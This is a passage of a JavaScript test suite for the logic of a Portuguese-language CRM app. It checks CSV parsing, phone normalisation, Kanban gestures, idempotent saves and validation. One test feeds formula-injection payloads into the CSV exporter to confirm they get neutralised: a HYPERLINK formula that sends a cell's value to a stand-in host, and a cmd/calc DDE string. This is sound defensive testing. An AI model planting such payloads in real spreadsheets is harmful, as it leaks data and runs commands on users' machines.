/* ============================================================
   ÓRBITA — testes do CRM (Node puro, sem dependências) · frente F4
   node testes/crm.teste.mjs
   (a) crm-logica.js: telefone (mesma regra do banco), CSV, mapeamento,
       lotes, ordemEntre, previsao, filtrar, moverLocal, campos, textos
   (b) estáticos dos arquivos do CRM: sem import estático, sem innerHTML
       com dado, sem hex de cor fora de :root, [hidden] forte, sem 1fr solto,
       node --check em todos
   ============================================================ */
import assert from "node:assert/strict";
import { readFileSync, existsSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const AQUI = dirname(fileURLToPath(import.meta.url));
const APP = join(AQUI, "..", "web", "app");
const ler = f => readFileSync(join(APP, f), "utf8");

let ok = 0, falhas = 0;
async function teste(nome, fn) {
  try { await fn(); ok++; console.log(`  ✓ ${nome}`); }
  catch (e) { falhas++; console.log(`  ✗ ${nome}\n      ${String(e && e.stack || e).split("\n").slice(0, 4).join("\n      ")}`); }
}

const L = await import("../web/app/crm-logica.js");

/* ============================================================ (a) lógica */
console.log("\n(a) crm-logica.js");

await teste("normalizarTelefone = nx_tel_normalizar (digitado ganha 55; WhatsApp fica como veio)", () => {
  assert.equal(L.normalizarTelefone("(12) 99830-3030"), "5512998303030");
  assert.equal(L.normalizarTelefone("12 3456-7890"), "551234567890");
  assert.equal(L.normalizarTelefone("+55 12 99830-3030"), "5512998303030");
  assert.equal(L.normalizarTelefone("447911123456"), "447911123456");
  assert.equal(L.normalizarTelefone("123"), null);
  assert.equal(L.normalizarTelefone("1234567890123456"), null);
  assert.equal(L.normalizarTelefone(""), null);
  assert.equal(L.normalizarTelefone(null), null);
  assert.equal(L.normalizarTelefone("5512998303030", true), "5512998303030");
  assert.equal(L.normalizarTelefone("12345678", true), "12345678");
  assert.equal(L.normalizarTelefone("1234567", true), null);
});

await teste("telChave = nx_tel_chave (com e sem 55/9 viram a mesma pessoa)", () => {
  assert.equal(L.telChave("5512998303030"), "1298303030");
  assert.equal(L.telChave("551298303030"), "1298303030");
  assert.equal(L.telChave("551234567890"), "1234567890");
  assert.equal(L.telChave("447911123456"), "447911123456");
  assert.equal(L.telChave(null), null);
  assert.ok(L.mesmoTelefone("(12) 99830-3030", "12 9830-3030"));
  assert.ok(L.mesmoTelefone("5512998303030", "551298303030"));
  assert.ok(!L.mesmoTelefone("12998303030", "12998303031"));
});

await teste("lerCSV: ponto e vírgula, BOM e CRLF", () => {
  const r = L.lerCSV("﻿Nome;Telefone;E-mail\r\nAna;(12) 99830-3030;ana@x.com\r\nBeto;12 3456-7890;\r\n");
  assert.equal(r.separador, ";");
  assert.deepEqual(r.cabecalho, ["Nome", "Telefone", "E-mail"]);
  assert.deepEqual(r.linhas, [["Ana", "(12) 99830-3030", "ana@x.com"], ["Beto", "12 3456-7890", ""]]);
  assert.equal(r.total, 2);
});

await teste("lerCSV: vírgula com aspas contendo vírgula, aspas escapadas e quebra de linha", () => {
  const txt = 'nome,obs,valor\n"Silva, Ana","disse ""oi""\nna recepção",1.500\nBeto,,20\n';
  const r = L.lerCSV(txt);
  assert.equal(r.separador, ",");
  assert.deepEqual(r.linhas[0], ["Silva, Ana", 'disse "oi"\nna recepção', "1.500"]);
  assert.deepEqual(r.linhas[1], ["Beto", "", "20"]);
});

await teste("lerCSV: tab (colado do Excel), CR sozinho, linhas vazias e colunas faltando", () => {
  const r = L.lerCSV("nome\ttelefone\tcidade\rAna\t12998303030\r\r\nBeto\t1234567890\n");
  assert.equal(r.separador, "\t");
  assert.deepEqual(r.linhas, [["Ana", "12998303030", ""], ["Beto", "1234567890", ""]]);
});

await teste("lerCSV: separador detectado com ; ganhando empate e limite de linhas", () => {
  assert.equal(L.detectarSeparador("a;b,c\n1;2,3"), ";");
  assert.equal(L.detectarSeparador("a,b,c\n1,2,3"), ",");
  const muitas = "n\n" + Array.from({ length: 30 }, (_, i) => `x${i}`).join("\n");
  const r = L.lerCSV(muitas, { limite: 20 });
  assert.equal(r.linhas.length, 20);
  assert.equal(r.total, 30);
  assert.ok(r.cortado);
});

await teste("sugerirMapeamento: nomes comuns, acentos, campos personalizados e sem repetir destino", () => {
  const cab = ["Nome completo", "Celular", "WhatsApp", "E-mail", "Cidade", "UF", "Data de Nascimento", "CPF", "Observações", "Tags", "Valor", "Etapa", "Convênio médico", "Coluna X"];
  const campos = [{ entidade: "contato", chave: "convenio_medico", rotulo: "Convênio médico" }];
  const m = L.sugerirMapeamento(cab, campos);
  assert.deepEqual(m, ["nome", "telefone", null, "email", "cidade", "uf", "nascimento", "documento", "obs", "etiquetas", "negocio_valor", "estagio", "campo:convenio_medico", null]);
});

await teste("montarLinhas + checarLinha", () => {
  const linhas = L.montarLinhas([["Ana", "12998303030", "Plano X"], ["", "", ""], ["Beto", "123", ""]],
    ["nome", "telefone", "campo:convenio"]);
  assert.deepEqual(linhas[0], { nome: "Ana", telefone: "12998303030", campos: { convenio: "Plano X" } });
  assert.deepEqual(linhas[1], {});
  assert.deepEqual(L.checarLinha(linhas[0]), []);
  assert.equal(L.checarLinha(linhas[1]).length, 1);
  assert.deepEqual(L.checarLinha(linhas[2]), ["Telefone inválido"]);
  assert.deepEqual(L.checarLinha({ nome: "x", nascimento: "31/02/1990" }), ["Nascimento: use DD/MM/AAAA"]);
});

await teste("lotes de 100 e metade no tempo_esgotado (mínimo 10)", () => {
  const l = L.lotes(Array.from({ length: 250 }, (_, i) => i));
  assert.deepEqual(l.map(x => x.length), [100, 100, 50]);
  assert.equal(L.metadeLote(100), 50);
  assert.equal(L.metadeLote(15), 10);
  assert.equal(L.metadeLote(10), 10);
});

await teste("lerNumero e lerData", () => {
  assert.equal(L.lerNumero("1.234,56"), 1234.56);
  assert.equal(L.lerNumero("R$ 3.500"), 3500);
  assert.equal(L.lerNumero("1234.5"), 1234.5);
  assert.equal(L.lerNumero("abc"), null);
  assert.equal(L.lerNumero(""), null);
  assert.equal(L.lerData("31/12/1990"), "1990-12-31");
  assert.equal(L.lerData("1990-12-31"), "1990-12-31");
  assert.equal(L.lerData("30/02/2020"), null);
  assert.equal(L.lerData("12/1990"), null);
});

await teste("ordemEntre: topo, fim, meio, empate e coluna vazia", () => {
  assert.equal(L.ordemEntre(null, 10), 9);
  assert.equal(L.ordemEntre(10, null), 11);
  assert.equal(L.ordemEntre(10, 20), 15);
  assert.equal(L.ordemEntre(-1759000000, -1758999000), -1758999500);
  assert.equal(L.ordemEntre(5, 5), 5);
  assert.equal(L.ordemEntre(null, null, 1759000000000), -1759000000);
  const a = L.ordemEntre(1, 2), b = L.ordemEntre(1, a);
  assert.ok(1 < b && b < a && a < 2);
});

await teste("previsao: soma só etapas abertas, ponderada pela probabilidade", () => {
  const estagios = [{ id: "a", tipo: "aberto", probabilidade: 10 }, { id: "b", tipo: "aberto", probabilidade: 50 },
    { id: "g", tipo: "ganho", probabilidade: 100 }, { id: "p", tipo: "perdido", probabilidade: 0 }];
  const colunas = [{ estagio_id: "a", total: 3, soma_previsto: 3500 }, { estagio_id: "b", total: 2, soma_previsto: 1000 },
    { estagio_id: "g", total: 5, soma_previsto: 9000, soma_valor: 8000 }, { estagio_id: "p", total: 1, soma_previsto: 200 }];
  assert.deepEqual(L.previsao(colunas, estagios), { abertos: 5, soma_aberto: 4500, previsao_ponderada: 850 });
  assert.deepEqual(L.previsao([], estagios), { abertos: 0, soma_aberto: 0, previsao_ponderada: 0 });
});

await teste("moverLocal: tira de uma coluna, põe na outra e ajusta contagens e somas", () => {
  const cols = [
    { estagio_id: "a", total: 2, soma_previsto: 300, soma_valor: 0, itens: [{ id: 1, valor_previsto: 100, ordem: 1 }, { id: 2, valor_previsto: 200, ordem: 2 }] },
    { estagio_id: "g", total: 0, soma_previsto: 0, soma_valor: 0, itens: [] },
  ];
  const n = L.moverLocal(cols, 2, "g", 0, 5, { valor: 250, status: "ganho" });
  assert.equal(n[0].total, 1); assert.equal(n[0].soma_previsto, 100); assert.deepEqual(n[0].itens.map(x => x.id), [1]);
  assert.equal(n[1].total, 1); assert.equal(n[1].soma_valor, 250); assert.equal(n[1].itens[0].estagio_id, "g");
  assert.equal(n[1].itens[0].ordem, 5);
  assert.equal(cols[0].itens.length, 2, "não muda o original");
  const r = L.moverLocal(cols, 1, "a", 1, 3);
  assert.deepEqual(r[0].itens.map(x => x.id), [2, 1]);
  assert.equal(r[0].total, 2);
});

await teste("gesto de toque no Kanban (M23): toque curto abre, rolagem nunca arrasta, toque longo levanta, arrasta e solta", () => {
  // toque curto: soltar antes dos 350 ms = o click normal abre o cartão
  let g = L.novoGesto(100, 200, 1000);
  assert.equal(L.gestoSoltar(g, 1120).acao, "toque");
  // rolagem (mexeu > 10 px antes dos 350 ms): vira «rolando» e NUNCA arrasto, mesmo que o dedo pare depois dos 350 ms
  let r = L.gestoMover(g, 100, 230, 1080);
  assert.equal(r.estado, "rolando"); assert.equal(r.acao, "rolar");
  r = L.gestoMover(r, 100, 232, 1600);
  assert.equal(r.estado, "rolando"); assert.equal(r.acao, null);
  assert.equal(L.gestoSoltar(r, 1700).acao, "nada");
  // tremor de até 10 px antes dos 350 ms não é rolagem
  r = L.gestoMover(g, 104, 205, 1100);
  assert.equal(r.estado, "espera"); assert.equal(r.acao, null);
  // toque longo: levanta aos 350 ms (não antes); soltar sem mexer abre «Mover para…»
  g = L.novoGesto(100, 200, 0);
  assert.deepEqual([L.gestoTempo(g, 349).estado, L.gestoTempo(g, 349).acao], ["espera", null]);
  const lev = L.gestoTempo(g, 350);
  assert.deepEqual([lev.estado, lev.acao], ["levantado", "levantar"]);
  assert.equal(L.gestoSoltar(lev, 900).acao, "mover_para");
  // levantado: mexer menos que o limiar de arrasto (6 px) segue levantado; a partir dele arrasta; depois só «mover»; soltar = soltar no destino
  let a = L.gestoMover(lev, 103, 202, 500);
  assert.equal(a.estado, "levantado"); assert.equal(a.acao, null);
  a = L.gestoMover(a, 100, 212, 520);
  assert.equal(a.estado, "arrastando"); assert.equal(a.acao, "arrastar");
  a = L.gestoMover(a, 100, 300, 540);
  assert.equal(a.estado, "arrastando"); assert.equal(a.acao, "mover");
  assert.equal(L.gestoSoltar(a, 600).acao, "soltar");
  // o timer atrasou: parado 400 ms e depois 40 px = levantou e arrastou (não é rolagem)
  a = L.gestoMover(L.novoGesto(0, 0, 0), 40, 0, 400);
  assert.equal(a.estado, "arrastando"); assert.equal(a.acao, "arrastar"); assert.equal(a.levantou, true);
  // soltar depois dos 350 ms sem o timer ter rodado = «Mover para…»
  assert.equal(L.gestoSoltar(L.novoGesto(0, 0, 0), 360).acao, "mover_para");
  // o sistema tomou o gesto (pointercancel): nunca solta nem move
  assert.equal(L.gestoCancelar(a).acao, "nada");
  assert.deepEqual(L.TOQUE, { MS_LONGO: 350, LIMIAR_ROLAGEM: 10, LIMIAR_ARRASTO: 6 });
});

await teste("destino do arrasto: posição na coluna pelo meio dos cartões, coluna/etapa pelo ponto e resumo dos totais", () => {
  const cartoes = [{ top: 0, bottom: 100 }, { top: 110, bottom: 210 }];
  assert.equal(L.indiceDoPonto(cartoes, 40), 0);
  assert.equal(L.indiceDoPonto(cartoes, 60), 1);
  assert.equal(L.indiceDoPonto(cartoes, 170), 2);
  assert.equal(L.indiceDoPonto([], 50), 0);
  const alvos = [{ id: "a", left: 0, right: 100, top: 0, bottom: 50 }, { id: "b", left: 110, right: 210, top: 0, bottom: 50 }];
  assert.equal(L.alvoDoPonto(alvos, 150, 20), "b");
  assert.equal(L.alvoDoPonto(alvos, 105, 20), null);
  assert.equal(L.alvoDoPonto(alvos, 50, 80), null);
  assert.equal(L.resumoDoFunil({ abertos: 3, soma: "R$ 12.950", previsao: "R$ 4.735" }, "a"), "3 abertas · R$ 12.950 · previsão R$ 4.735");
  assert.equal(L.resumoDoFunil({ abertos: 1, soma: "R$ 900", previsao: "R$ 90" }, "a"), "1 aberta · R$ 900 · previsão R$ 90");
  assert.equal(L.resumoDoFunil({ abertos: 2, soma: "R$ 5", previsao: "" }, "o"), "2 abertos · R$ 5");
  assert.equal(L.resumoDoFunil({}, "o"), "0 abertos");
});

await teste("escrita segura (M25): chave p_req, erro ambíguo e repetição com a MESMA chave (nunca duplica)", async () => {
  // chave: uuid v4 (com e sem crypto.randomUUID)
  const RE = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;
  assert.match(L.novaReq(), RE);
  assert.match(L.novaReq(null), RE);
  assert.match(L.novaReq({ getRandomValues: a => a.fill(7) }), RE);
  assert.notEqual(L.novaReq(), L.novaReq());
  // quais erros deixam dúvida
  for (const c of ["tempo_rede", "tempo_esgotado", "sem_conexao", "resposta_invalida", "servico_indisponivel", "http_502", "http_503", "http_504"]) assert.ok(L.erroAmbiguo({ codigo: c }), c);
  assert.ok(L.erroAmbiguo({ codigo: "xyz", status: 503 }));
  for (const c of ["horario_ocupado", "dados_invalidos", "http_500", "http_429", "sem_permissao", "negocio_nao_encontrado"]) assert.ok(!L.erroAmbiguo({ codigo: c }), c);
  assert.ok(!L.erroAmbiguo(null));
  // servidor FALSO: aplica e guarda por p_req (como a migração 20261002c)
  const mk = (falhas = []) => {
    const guardado = new Map(), criados = [], chamadas = [];
    return { criados, chamadas, api: { async rpcC(nome, p) {
      chamadas.push({ nome, p_req: p.p_req });
      const f = falhas.shift();
      if (f && f.antes) throw Object.assign(new Error(f.antes), { codigo: f.antes });
      let r;
      if (guardado.has(p.p_req)) r = guardado.get(p.p_req);
      else { r = { id: criados.length + 1, titulo: p.p_negocio.titulo }; criados.push(r); guardado.set(p.p_req, r); }
      if (f && f.depois) throw Object.assign(new Error(f.depois), { codigo: f.depois });     // aplicou, mas a resposta se perdeu
      return r;
    } } };
  };
  const sem = async () => {};
  // 1) sem falha: uma chamada, uma criação, com p_req
  let s = mk();
  let r = await L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "A" } }, { dormir: sem });
  assert.deepEqual([s.criados.length, s.chamadas.length, r.repetiu], [1, 1, false]);
  assert.match(s.chamadas[0].p_req, RE);
  // 2) PRAZO ESTOURADO DEPOIS de o servidor aplicar: repete com a mesma chave e continua sendo 1 registro
  s = mk([{ depois: "tempo_rede" }]);
  const status = [];
  r = await L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "B" } }, { dormir: sem, aoStatus: t => status.push(t) });
  assert.equal(s.criados.length, 1, "1 registro, não 2");
  assert.equal(s.chamadas.length, 2);
  assert.equal(s.chamadas[0].p_req, s.chamadas[1].p_req, "a repetição leva a MESMA chave");
  assert.deepEqual([r.repetiu, r.resultado.id], [true, 1]);
  assert.deepEqual(status, ["Conferindo se foi salvo…"]);
  // 3) caiu ANTES de chegar: a repetição aplica agora (1 registro)
  s = mk([{ antes: "sem_conexao" }, { antes: "sem_conexao" }]);
  r = await L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "C" } }, { dormir: sem });
  assert.deepEqual([s.criados.length, s.chamadas.length], [1, 3]);
  // 4) sem sucesso depois das tentativas: erro marcado como ambíguo e com a chave para «Salvar de novo»
  s = mk([{ antes: "sem_conexao" }, { antes: "sem_conexao" }, { antes: "sem_conexao" }]);
  await assert.rejects(() => L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "D" } }, { dormir: sem }), e => e.ambigua === true && RE.test(e.req) && e.codigo === "sem_conexao");
  // …e o «Salvar de novo» com a MESMA chave grava uma vez só (mesmo que o 1º já tivesse gravado)
  s = mk([{ depois: "sem_conexao" }, { antes: "sem_conexao" }, { antes: "sem_conexao" }, null]);
  let chave = null;
  await assert.rejects(() => L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "E" } }, { dormir: sem }), e => { chave = e.req; return e.ambigua; });
  assert.equal(s.criados.length, 1, "o 1º pedido tinha sido gravado");
  r = await L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "E" } }, { req: chave, dormir: sem });
  assert.equal(s.criados.length, 1, "salvar de novo com a mesma chave NÃO duplica");
  assert.equal(r.resultado.id, 1);
  // 5) recusa do servidor não repete e leva a chave
  s = mk([{ antes: "dados_invalidos" }]);
  await assert.rejects(() => L.escreverComReq(s.api, "nx_negocio_salvar", { p_negocio: { titulo: "F" } }, { dormir: sem }), e => e.codigo === "dados_invalidos" && !e.ambigua && RE.test(e.req));
  assert.equal(s.chamadas.length, 1);
  // 6) mover entre tipos de etapa fica adiado pelos 7 s do Desfazer (automações)
  assert.ok(L.movimentoAdiado("aberto", "ganho") && L.movimentoAdiado("aberto", "perdido") && L.movimentoAdiado("ganho", "aberto") && L.movimentoAdiado("perdido", "ganho"));
  assert.ok(!L.movimentoAdiado("aberto", "aberto") && !L.movimentoAdiado(null, "ganho"));
});

await teste("filtrar local: busca sem acento, telefone, dono, etiquetas alguma/todas/nenhuma, origem, valor", () => {
  const cards = [
    { id: 1, titulo: "Implante", nome: "João da Silva", telefone: "5512998303030", dono_id: "u1", etiquetas: ["e1"], origem: "anuncio", valor_previsto: 3500 },
    { id: 2, titulo: "Clareamento", nome: "João da Silva", telefone: "5512998303030", dono_id: "u1", etiquetas: ["e1", "e2"], origem: "manual", valor_previsto: null },
    { id: 3, titulo: "Ortodontia", nome: "Márcia Araújo", telefone: "5512981112222", dono_id: null, etiquetas: ["e3"], origem: "whatsapp", valor_previsto: 800 },
  ];
  const ids = f => L.filtrar(cards, f, { eu: "u1" }).map(c => c.id);
  assert.deepEqual(ids({ busca: "joao" }), [1, 2]);
  assert.deepEqual(ids({ busca: "ARAUJO" }), [3]);
  assert.deepEqual(ids({ busca: "98111" }), [3]);
  assert.deepEqual(ids({ busca: "(12) 99830" }), [1, 2]);
  assert.deepEqual(ids({ dono: "eu" }), [1, 2]);
  assert.deepEqual(ids({ dono: "sem" }), [3]);
  assert.deepEqual(ids({ etiquetas: { op: "alguma", ids: ["e1", "e3"] } }), [1, 2, 3]);
  assert.deepEqual(ids({ etiquetas: { op: "todas", ids: ["e1", "e2"] } }), [2]);
  assert.deepEqual(ids({ etiquetas: { op: "nenhuma", ids: ["e1"] } }), [3]);
  assert.deepEqual(ids({ origem: ["anuncio", "whatsapp"] }), [1, 3]);
  assert.deepEqual(ids({ valor_min: 1000 }), [1]);
  assert.deepEqual(ids({ valor_max: 1000 }), [2, 3]);
  assert.ok(L.filtroVazio({ fechados_dias: 30, busca: "", etiquetas: { op: "alguma", ids: [] }, origem: [] }));
  assert.ok(!L.filtroVazio({ dono: "eu" }));
});

await teste("pedidoAoMover e funisPermitidos (trava do Ads)", () => {
  const e = { id: "x", tipo: "aberto", marco: "nova" };
  assert.equal(L.pedidoAoMover({ id: "g", tipo: "ganho" }, e), "ganho");
  assert.equal(L.pedidoAoMover({ id: "p", tipo: "perdido" }, e), "perdido");
  assert.equal(L.pedidoAoMover({ id: "a", tipo: "aberto", marco: "agendada" }, e), "agendada");
  assert.equal(L.pedidoAoMover({ id: "o", tipo: "aberto", marco: "orcamento" }, e), null);
  assert.equal(L.pedidoAoMover(e, e), null, "mesma etapa (reordenar) não pede nada");
  const funis = [{ id: "ads", conta_no_ads: true }, { id: "ads2", conta_no_ads: true }, { id: "pos", conta_no_ads: false }];
  assert.deepEqual(L.funisPermitidos(funis, "ads", "ganho").map(f => f.id), ["ads"]);
  assert.deepEqual(L.funisPermitidos(funis, "ads", "aberto").map(f => f.id), ["ads", "ads2"]);
  assert.deepEqual(L.funisPermitidos(funis, "pos", "aberto").map(f => f.id), ["ads", "ads2", "pos"]);
});

await teste("validarCampo por tipo e obrigatório", () => {
  const v = (tipo, valor, extra = {}) => L.validarCampo({ tipo, rotulo: "X", ...extra }, valor);
  assert.equal(v("texto", ""), null);
  assert.match(v("texto", "", { obrigatorio: true }), /Preencha/);
  assert.equal(v("numero", "12,5"), null);
  assert.ok(v("numero", "doze"));
  assert.equal(v("moeda", "R$ 1.200,00"), null);
  assert.ok(v("moeda", "-3"));
  assert.equal(v("data", "31/12/2026"), null);
  assert.ok(v("data", "31/13/2026"));
  assert.equal(v("email", "a@b.co"), null);
  assert.ok(v("email", "a@b"));
  assert.equal(v("url", "https://kamiguchi.com.br"), null);
  assert.ok(v("url", "kamiguchi"));
  assert.equal(v("telefone", "(12) 99830-3030"), null);
  assert.ok(v("telefone", "123"));
  assert.equal(v("opcao", "Unimed", { opcoes: ["Unimed", "Bradesco"] }), null);
  assert.ok(v("opcao", "Outro", { opcoes: ["Unimed"] }));
  assert.equal(v("multi", ["A", "B"], { opcoes: ["A", "B", "C"] }), null);
  assert.ok(v("multi", "A; Z", { opcoes: ["A", "B"] }));
  assert.equal(v("sim_nao", true), null);
  assert.match(v("multi", [], { obrigatorio: true, opcoes: ["A"] }), /Preencha/);
  assert.equal(L.normalizarCampo({ tipo: "moeda" }, "1.200,50"), 1200.5);
  assert.equal(L.normalizarCampo({ tipo: "data" }, "01/02/2026"), "2026-02-01");
  assert.deepEqual(L.normalizarCampo({ tipo: "multi" }, "A; B"), ["A", "B"]);
  const campos = [{ entidade: "negocio", chave: "proc", obrigatorio: true, funil_id: "f1", ordem: 1 },
    { entidade: "negocio", chave: "conv", obrigatorio: true, funil_id: null, ordem: 2 },
    { entidade: "negocio", chave: "outro", obrigatorio: true, funil_id: "f2", ordem: 3 },
    { entidade: "contato", chave: "c", obrigatorio: true }];
  assert.deepEqual(L.obrigatoriosVazios(campos, "negocio", "f1", { conv: "x" }).map(c => c.chave), ["proc"]);
  assert.deepEqual(L.camposDe(campos, "negocio", "f2").map(c => c.chave), ["conv", "outro"]);
});

await teste("tempo na etapa e SLA", () => {
  const agora = new Date("2026-09-28T12:00:00Z");
  assert.equal(L.textoDiasEtapa("2026-09-28T09:00:00Z", agora), "hoje na etapa");
  assert.equal(L.textoDiasEtapa("2026-09-27T09:00:00Z", agora), "há 1 dia na etapa");
  assert.equal(L.textoDiasEtapa("2026-09-18T12:00:00Z", agora), "há 10 dias na etapa");
  assert.ok(L.slaEstourado("2026-09-26T11:00:00Z", 48, agora));
  assert.ok(!L.slaEstourado("2026-09-26T13:00:00Z", 48, agora));
  assert.ok(!L.slaEstourado("2026-09-01T13:00:00Z", null, agora));
  assert.equal(L.paraDataHoraLocal("2026-10-05T17:30:00Z"), "2026-10-05T14:30");
  assert.equal(L.paraDataHoraLocal(null), "");
});

await teste("tituloCard, formatarTel e textoErro (rótulo do campo, trava do Ads, códigos do CRM)", () => {
  assert.equal(L.tituloCard({ titulo: "Implante" }), "Implante");
  assert.equal(L.tituloCard({ titulo: "", contato: { nome: "Ana" } }), "Ana");
  assert.equal(L.tituloCard({ nome: "Removido" }), "Removido");
  assert.equal(L.tituloCard({ telefone: "5512998303030" }), "(12) 99830-3030");
  assert.equal(L.tituloCard({}), "Sem nome");
  const campos = [{ chave: "procedimento", rotulo: "Procedimento realizado" }];
  assert.equal(L.textoErro({ codigo: "campo_obrigatorio", hint: "procedimento" }, { campos }), 'Preencha o campo "Procedimento realizado" antes de continuar.');
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "fechado_no_ads" }), /Iniciar pós-venda/);
  assert.match(L.textoErro({ codigo: "funil_invalido", hint: "sai_do_ads" }), /outro funil de anúncios/);
  assert.equal(L.textoErro({ codigo: "motivo_obrigatorio", hint: "texto" }), "Escolha o motivo da perda e escreva a justificativa.");
  assert.match(L.textoErro({ codigo: "tarefa_nao_encontrada" }), /tarefa/);
  assert.match(L.textoErro({ codigo: "dados_invalidos", hint: "optin_origem" }), /autorização/);
  assert.equal(L.textoErro({ codigo: "xyz" }, { padrao: () => "padrão" }), "padrão");
});

await teste("textoTempo e iconeTempo", () => {
  const vocab = { min: () => "oportunidade", art: () => "a", ganhar: "Fechou", perder: "Não fechou" };
  assert.equal(L.textoTempo({ fonte: "historico", tipo: "estagio", dados: { de_nome: "Nova conversa", para_nome: "Avaliou" } }), "Moveu de «Nova conversa» para «Avaliou»");
  assert.equal(L.textoTempo({ fonte: "historico", tipo: "ganho", dados: { valor: 3200 } }, { vocab, brl: v => `R$ ${v}` }), "Marcou como fechou · R$ 3200");
  assert.equal(L.textoTempo({ fonte: "historico", tipo: "negocio_criado", dados: { titulo: "Implante" } }, { vocab }), "Criou a oportunidade «Implante»");
  assert.equal(L.textoTempo({ fonte: "historico", tipo: "dono", dados: { para: "u1" } }, { nomes: { u1: "Ana" } }), "Responsável: Ana");
  assert.equal(L.textoTempo({ fonte: "nota", tipo: "nota", dados: { texto: "oi" } }), "Nota: oi");
  assert.equal(L.textoTempo({ fonte: "tarefa", tipo: "tarefa_concluida", dados: { titulo: "Ligar" } }), "Concluiu a tarefa «Ligar»");
  assert.equal(L.iconeTempo({ fonte: "historico", tipo: "ganho" }), "check");
  assert.equal(L.iconeTempo({ fonte: "nota" }), "nota");
});

await teste("gerarCSV com ; e BOM (erros da importação)", () => {
  const t = L.gerarCSV(["linha", "motivo"], [[2, 'Telefone "ruim"; e mais'], [5, "ok"]]);
  assert.ok(t.startsWith("﻿"));
  assert.equal(t.slice(1), 'linha;motivo\r\n2;"Telefone ""ruim""; e mais"\r\n5;ok');
});

await teste("CSV: fórmula (=, +, -, @) do nome do WhatsApp não vira fórmula no Excel e volta igual na importação", () => {
  const maus = ['=HYPERLINK("https://x.test/?"&A2;"Clique")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1:A9)", "\t=1+1"];
  for (const m of maus) {
    const c = L.csvCampo(m);
    assert.ok(!/^"?[=+\-@\t\r]/.test(c), `continua fórmula: ${c}`);
  }
  assert.equal(L.csvCampo("=1+1"), "'=1+1");
  // número puro, telefone de fora e texto comum ficam como estão
  for (const ok of ["-5", "-1.234,56", "+5512998303030", "12", "Ana", "(12) 99830-3030", ""]) assert.equal(L.csvCampo(ok), ok);
  // exportar → importar: o ' de proteção sai e o valor volta como era
  const csv = L.gerarCSV(["Nome", "Telefone"], [["=HYPERLINK(1)", "(12) 99830-3030"], ["@Ana", "+447911123456"]]);
  const d = L.lerCSV(csv);
  assert.deepEqual(L.montarLinhas(d.linhas, ["nome", "telefone"]), [{ nome: "=HYPERLINK(1)", telefone: "(12) 99830-3030" }, { nome: "@Ana", telefone: "+447911123456" }]);
  assert.deepEqual(L.montarLinhas([["'Ana"]], ["nome"]), [{ nome: "'Ana" }], "apóstrofo comum não é tirado");
});

await teste("lerCSV devolve o número da linha da planilha (cabeçalho = 1, contando linhas vazias)", () => {
  const r = L.lerCSV('nome;obs\r\nAna;"duas\nlinhas"\r\n\r\n;\r\nBeto;x\n');
  assert.deepEqual(r.linhas.map(l => l[0]), ["Ana", "Beto"]);
  assert.deepEqual(r.numeros, [2, 5]);
});

await teste("decodificarArquivo: UTF-8 e planilha ANSI do Excel (Windows-1252)", () => {
  assert.deepEqual(L.decodificarArquivo(new TextEncoder().encode("João;Conceição")), { texto: "João;Conceição", codificacao: "utf-8" });
  const ansi = new Uint8Array([0x4a, 0x6f, 0xe3, 0x6f, 0x3b, 0x41, 0xe7, 0xfa, 0x63, 0x61, 0x72]); // "João;Açúcar"
  assert.deepEqual(L.decodificarArquivo(ansi), { texto: "João;Açúcar", codificacao: "windows-1252" });
});

await teste("importação: destinos, mapa válido, negócio no mapa, soma dos lotes e resumo", () => {
  const d = L.destinosImportacao([{ entidade: "contato", chave: "convenio", rotulo: "Convênio" }, { entidade: "negocio", chave: "x", rotulo: "X" }]);
  assert.ok(d.some(x => x.valor === "campo:convenio" && x.rotulo === "Campo: Convênio"));
  assert.ok(!d.some(x => x.valor === "campo:x"));
  assert.ok(L.mapaValido([null, "telefone"]) && L.mapaValido(["email"]) && !L.mapaValido(["cidade", null]));
  assert.ok(L.mapaTemNegocio(["nome", "negocio_valor"]) && !L.mapaTemNegocio(["nome"]));
  let s = L.somarImportacao(null, { criados: 90, ignorados: 10, erros: [], avisos: [{ linha: 3, motivo: "x" }] });
  s = L.somarImportacao(s, { criados: 1, atualizados: 2, erros: [{ linha: 150, motivo: "y" }] });
  assert.deepEqual([s.criados, s.atualizados, s.ignorados, s.erros.length, s.avisos.length], [91, 2, 10, 1, 1]);
  assert.equal(L.textoResumoImportacao(s), "91 criados · 2 atualizados · 10 ignorados · 1 erro");
});

await teste("validarFunil: mesmas regras do nx_funil_salvar", () => {
  const ok = { nome: "Pós", conta_no_ads: false, estagios: [{ nome: "A", tipo: "aberto" }, { nome: "G", tipo: "ganho" }, { nome: "P", tipo: "perdido" }] };
  assert.deepEqual(L.validarFunil(ok), []);
  const hints = f => L.validarFunil(f).map(e => e.hint);
  assert.deepEqual(hints({ ...ok, nome: " " }), ["nome"]);
  assert.deepEqual(hints({ ...ok, estagios: ok.estagios.slice(0, 2) }), ["tipos"]);
  assert.deepEqual(hints({ ...ok, estagios: [...ok.estagios, { nome: "a", tipo: "aberto" }] }), ["etapa_repetida"]);
  assert.deepEqual(hints({ ...ok, estagios: [...ok.estagios, { nome: "", tipo: "aberto" }] }), ["etapa_nome"]);
  assert.deepEqual(hints({ ...ok, conta_no_ads: true }), ["marco_obrigatorio", "marco_obrigatorio", "marco_obrigatorio"]);
  const ads = { nome: "Ads", conta_no_ads: true, estagios: [{ nome: "A", tipo: "aberto", marco: "agendada" }, { nome: "G", tipo: "ganho", marco: "fechou" }, { nome: "P", tipo: "perdido", marco: "perdida" }] };
  assert.deepEqual(hints(ads), ["marcos"]);
  assert.deepEqual(hints({ ...ads, estagios: [{ ...ads.estagios[0], marco: "nova" }, ads.estagios[1], ads.estagios[2]] }), []);
  assert.deepEqual(hints({ ...ads, estagios: [{ ...ads.estagios[0], marco: "fechou" }, ads.estagios[1], ads.estagios[2]] }), ["marco_tipo"]);
